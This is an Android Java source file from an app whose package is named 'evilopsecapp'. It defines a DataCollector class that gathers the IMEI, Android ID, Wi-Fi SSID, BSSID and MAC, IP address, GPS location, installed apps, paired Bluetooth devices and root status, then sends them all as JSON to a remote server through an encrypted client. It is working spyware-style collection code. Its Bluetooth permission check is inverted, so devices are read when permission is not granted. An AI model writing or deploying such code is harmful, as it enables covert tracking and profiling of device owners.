package com.example.evilopsecapp.datacollection;

import android.Manifest;
import android.app.ActivityManager;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;

import android.util.DisplayMetrics;
import android.view.WindowManager;

import androidx.core.app.ActivityCompat;

import java.util.TimeZone;

public class DataCollector {
    private final Context context;
    private static final String TAG = "DataCollector";
    private final FusedLocationProviderClient fusedLocationClient;

    public DataCollector(Context context) {
        this.context = context;
        this.fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);
    }

    public void collectAndSendData() {
        try {
            // Create JSON object with all collected data
            JSONObject collectedData = new JSONObject();
            collectedData.put("device_info", getDeviceInfo());
            collectedData.put("network_info", getNetworkInfo());
            collectedData.put("location_info", getLocationInfo());
            collectedData.put("sensor_info", getSensorInfo());
            collectedData.put("installed_apps", getInstalledApps());
            collectedData.put("battery_info", getBatteryInfo());
            collectedData.put("storage_info", getStorageInfo());
            collectedData.put("bluetooth_devices", getBluetoothDevices());
            collectedData.put("security_info", getSecurityInfo());
            collectedData.put("hardware_info", getHardwareInfo());
            collectedData.put("system_info", getSystemInfo());

            // Convert JSON to string for sending
            String jsonData = collectedData.toString();

            Log.d(TAG, "Collected JSON Data: " + jsonData);

            // Send data securely using ECDHClient
            ECDHClient.sendSecureData(jsonData);
        } catch (Exception e) {
            Log.e(TAG, "Error collecting/sending data", e);
        }
    }

    private JSONObject getDeviceInfo() {
        JSONObject deviceInfo = new JSONObject();
        try {
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("android_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
            deviceInfo.put("build_fingerprint", Build.FINGERPRINT);
            deviceInfo.put("cpu_architecture", System.getProperty("os.arch"));

            // Get IMEI if permission is granted
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null && context.checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                deviceInfo.put("imei", telephonyManager.getImei());
            }

        } catch (Exception e) {
            Log.e(TAG, "Error getting device info", e);
        }
        return deviceInfo;
    }

    private JSONObject getNetworkInfo() {
        JSONObject networkInfo = new JSONObject();
        try {
            WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();

            networkInfo.put("wifi_ssid", wifiInfo.getSSID());
            networkInfo.put("wifi_bssid", wifiInfo.getBSSID());
            networkInfo.put("ip_address", intToIp(wifiInfo.getIpAddress()));
            networkInfo.put("mac_address", wifiInfo.getMacAddress());

            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            networkInfo.put("carrier", telephonyManager.getNetworkOperatorName());
            networkInfo.put("network_country", telephonyManager.getNetworkCountryIso());
        } catch (Exception e) {
            Log.e(TAG, "Error getting network info", e);
        }
        return networkInfo;
    }

    private JSONObject getHardwareInfo() {
        JSONObject hardwareInfo = new JSONObject();
        try {
            // Screen Size & Density
            WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(metrics);
            hardwareInfo.put("screen_width", metrics.widthPixels);
            hardwareInfo.put("screen_height", metrics.heightPixels);
            hardwareInfo.put("screen_density", metrics.densityDpi);

            // RAM Information
            ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
            ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            activityManager.getMemoryInfo(memInfo);
            hardwareInfo.put("total_ram", memInfo.totalMem);
            hardwareInfo.put("available_ram", memInfo.availMem);
        } catch (Exception e) {
            Log.e(TAG, "Error getting hardware info", e);
        }
        return hardwareInfo;
    }

    private JSONObject getLocationInfo() {
        JSONObject locationInfo = new JSONObject();
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
                    if (location != null) {
                        try {
                            locationInfo.put("latitude", location.getLatitude());
                            locationInfo.put("longitude", location.getLongitude());
                            locationInfo.put("accuracy", location.getAccuracy());

                        } catch (Exception e) {
                            Log.e(TAG, "Error adding location data to JSON", e);
                        }
                    } else {
                        Log.e(TAG, "Location is null");
                    }
                });
            } else {
                Log.e(TAG, "Location permission not granted");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting location info", e);
        }
        return locationInfo;
    }

    private JSONArray getSensorInfo() {
        JSONArray sensorArray = new JSONArray();
        try {
            SensorManager sensorManager = (SensorManager) context.getSystemService(Context.SENSOR_SERVICE);
            List<Sensor> sensors = sensorManager.getSensorList(Sensor.TYPE_ALL);
            for (Sensor sensor : sensors) {
                sensorArray.put(sensor.getName());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting sensor info", e);
        }
        return sensorArray;
    }

    private JSONArray getInstalledApps() {
        JSONArray appsArray = new JSONArray();
        try {
            PackageManager packageManager = context.getPackageManager();
            List<ApplicationInfo> apps = packageManager.getInstalledApplications(0);
            for (ApplicationInfo app : apps) {
                appsArray.put(app.packageName);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting installed apps", e);
        }
        return appsArray;
    }

    private JSONObject getBatteryInfo() {
        JSONObject batteryInfo = new JSONObject();
        try {
            BatteryManager batteryManager = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            int batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            boolean isCharging = batteryManager.isCharging();

            batteryInfo.put("battery_percentage", batteryLevel);
            batteryInfo.put("is_charging", isCharging);
        } catch (Exception e) {
            Log.e(TAG, "Error getting battery info", e);
        }
        return batteryInfo;
    }

    private JSONObject getStorageInfo() {
        JSONObject storageInfo = new JSONObject();
        try {
            File internalStorage = Environment.getDataDirectory();
            File externalStorage = Environment.getExternalStorageDirectory();

            storageInfo.put("total_internal_storage", internalStorage.getTotalSpace());
            storageInfo.put("available_internal_storage", internalStorage.getFreeSpace());

            if (externalStorage.exists()) {
                storageInfo.put("total_external_storage", externalStorage.getTotalSpace());
                storageInfo.put("available_external_storage", externalStorage.getFreeSpace());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting storage info", e);
        }
        return storageInfo;
    }

    private JSONObject getSystemInfo() {
        JSONObject systemInfo = new JSONObject();
        try {
            systemInfo.put("uptime", System.currentTimeMillis() - android.os.SystemClock.elapsedRealtime());
            systemInfo.put("boot_time", System.currentTimeMillis() - android.os.SystemClock.elapsedRealtime());
            systemInfo.put("timezone", TimeZone.getDefault().getID());
            systemInfo.put("locale", Locale.getDefault().toString());
        } catch (Exception e) {
            Log.e(TAG, "Error getting system info", e);
        }
        return systemInfo;
    }

    private JSONArray getBluetoothDevices() {
        JSONArray bluetoothArray = new JSONArray();
        try {
            BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();

            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
                Set<BluetoothDevice> pairedDevices = bluetoothAdapter.getBondedDevices();
                for (BluetoothDevice device : pairedDevices) {
                    bluetoothArray.put(device.getName() + " - " + device.getAddress());
                }
            } else {
                Log.e(TAG, "Bluetooth permission not granted");
            }

        } catch (Exception e) {
            Log.e(TAG, "Error getting Bluetooth devices", e);
        }
        return bluetoothArray;
    }

    private JSONObject getSecurityInfo() {
        JSONObject securityInfo = new JSONObject();
        try {
            securityInfo.put("is_rooted", isRooted());
        } catch (Exception e) {
            Log.e(TAG, "Error getting security info", e);
        }
        return securityInfo;
    }

    private boolean isRooted() {
        String[] paths = {"/system/bin/su", "/system/xbin/su", "/system/app/Superuser.apk"};
        for (String path : paths) {
            if (new File(path).exists()) return true;
        }
        return false;
    }

    private String intToIp(int ip) {
        return String.format(Locale.getDefault(), "%d.%d.%d.%d",
                (ip & 0xFF), (ip >> 8 & 0xFF), (ip >> 16 & 0xFF), (ip >> 24 & 0xFF));
    }
}
